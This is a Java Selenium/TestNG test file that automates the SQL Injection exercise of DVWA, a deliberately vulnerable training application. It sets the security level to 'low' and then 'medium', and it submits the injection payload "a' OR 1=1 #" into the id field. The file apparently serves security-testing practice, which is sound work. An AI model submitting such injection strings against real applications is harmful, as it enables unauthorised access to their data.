package testcase;

import org.openqa.selenium.By;
import org.openqa.selenium.support.ui.Select;
import org.testng.annotations.Test;

import base.BaseTest;

public class Test4SQLinj {

	public class TestSQLInj extends BaseTest{
		boolean test = false;
		
		@Test
		public void sqlInjectionLow() throws InterruptedException {
		driver.findElement(By.linkText("DVWA Security")).click();
		Select drpCountry = new Select(driver.findElement(By.name("security")));
		drpCountry.selectByValue("low");
		driver.findElement(By.name("seclev_submit")).click();
		System.out.println(driver.getCurrentUrl());
		
		driver.findElement(By.linkText("SQL Injection")).click();
		driver.findElement(By.name("id")).sendKeys("a' OR 1=1 #");
		driver.findElement(By.xpath("//*[@id=\"main_body\"]/div/div/form/p/input[2]")).click();
		
				
		}
		
		@Test
		public void sqlInjectionHigh() throws InterruptedException {
		driver.findElement(By.linkText("DVWA Security")).click();
		Select drpCountry = new Select(driver.findElement(By.name("security")));
		drpCountry.selectByValue("medium");
		driver.findElement(By.name("seclev_submit")).click();
		System.out.println(driver.getCurrentUrl());
		
		driver.findElement(By.linkText("SQL Injection")).click();
		driver.findElement(By.name("id")).sendKeys("a' OR 1=1 #");
		driver.findElement(By.name("Submit")).click();
		
				
		}
		
		}
}
